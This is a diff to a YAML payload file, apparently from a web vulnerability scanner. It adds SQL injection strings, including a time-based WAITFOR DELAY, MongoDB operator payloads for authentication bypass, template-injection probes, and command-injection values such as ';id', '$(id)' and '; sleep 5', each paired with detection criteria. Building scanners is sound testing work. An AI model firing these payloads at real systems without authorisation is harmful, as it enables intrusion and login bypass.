@@ -1,5 +1,6 @@
 category: sql_injection
 description: "Payloads SQLi pour attaques boolean, time-based, error-based et union"
+
 payloads:
   - value: "' OR '1'='1"
     type: boolean
@@ -19,3 +20,59 @@ payloads:
   - value: "1' OR 1=1--"
     type: boolean
     detect: ["200", "length_change"]
+  - value: "' OR ''='"
+    type: boolean
+    detect: ["200", "length_change"]
+  - value: "1; WAITFOR DELAY '0:0:5'--"
+    type: time_based
+    detect: ["delay_gt_4000ms"]
+
+nosql_payloads:
+  - value: '{"$gt": ""}'
+    type: mongodb_operator
+    detect: ["200", "length_change"]
+  - value: '{"$where": "1==1"}'
+    type: mongodb_where
+    detect: ["200", "auth_bypass"]
+  - value: '{"$regex": ".*", "$options": "i"}'
+    type: mongodb_regex
+    detect: ["200", "length_change"]
+  - value: '{"$ne": null}'
+    type: mongodb_ne
+    detect: ["200", "length_change"]
+
+ssti_payloads:
+  - value: "{{7*7}}"
+    engine: jinja2_twig
+    expect: "49"
+  - value: "${7*7}"
+    engine: freemarker_el
+    expect: "49"
+  - value: "<%= 7*7 %>"
+    engine: erb_mako
+    expect: "49"
+  - value: "{{7*'7'}}"
+    engine: jinja2
+    expect: "7777777"
+  - value: "#{7*7}"
+    engine: ruby_el
+    expect: "49"
+  - value: "*{7*7}"
+    engine: spring_thymeleaf
+    expect: "49"
+
+cmdi_payloads:
+  - value: ";id"
+    detect: "uid="
+  - value: "|id"
+    detect: "uid="
+  - value: "$(id)"
+    detect: "uid="
+  - value: "`id`"
+    detect: "uid="
+  - value: ";whoami"
+    detect: "root"
+  - value: "| whoami"
+    detect: "root"
+  - value: "; sleep 5"
+    detect: "delay_gt_4000ms"
